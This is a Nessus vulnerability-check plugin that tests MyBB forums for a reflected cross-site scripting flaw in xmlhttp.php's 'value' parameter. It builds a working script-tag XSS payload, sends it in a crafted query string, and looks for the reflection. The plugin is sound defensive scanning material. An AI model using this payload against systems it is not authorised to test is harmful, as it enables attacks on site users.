#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(53288);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2015/05/22 19:48:53 $");

  script_bugtraq_id(47131);
  script_osvdb_id(75004);

  script_name(english:"MyBB xmlhttp.php 'value' Parameter XSS");
  script_summary(english:"Attempts a non-persistent XSS attack on xmlhttp.php");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a web application that is affected by a
cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of MyBB installed on the remote host is affected by a
cross-site scripting vulnerability due to improper validation of
user-supplied input to 'value' parameter of the 'xmlhttp.php' script.
A remote attacker can exploit this by enticing a user to click a
specially crafted URL.

Note that MyBB may also be affected by an additional cross-site
scripting vulnerability. However, Nessus has not tested for the issue.");
  script_set_attribute(attribute:"see_also", value:"http://blog.mybb.com/2011/02/22/mybb-1-6-2-and-1-4-15-security-update/");
  script_set_attribute(attribute:"see_also", value:"http://dev.mybb.com/issues/1460");
  script_set_attribute(attribute:"solution", value:"Upgrade to MyBB 1.4.15 / 1.6.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/02/22");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/02/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/04/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mybb:mybb");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2011-2015 Tenable Network Security, Inc.");

  script_dependencies("mybb_detect.nasl");
  script_require_keys("www/PHP", "installed_sw/MyBB");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "MyBB";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];

exploit = '<div xmlns="http://www.w3.org/1999/xhtml"><script>alert(\''+SCRIPT_NAME+'-'+unixtime()+'\')</script></div>';

exploited = test_cgi_xss(
  port:port,
  dirs:make_list(dir),
  cgi:'/xmlhttp.php',
  qs:'action=username_exists&value='+urlencode(str:exploit),
  pass_str:'<fail>'+exploit,
  ctrl_re:' is not the username of a registered member</fail>'
);

if (!exploited)
{
  install_url = build_url(qs:dir, port:port);
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
}
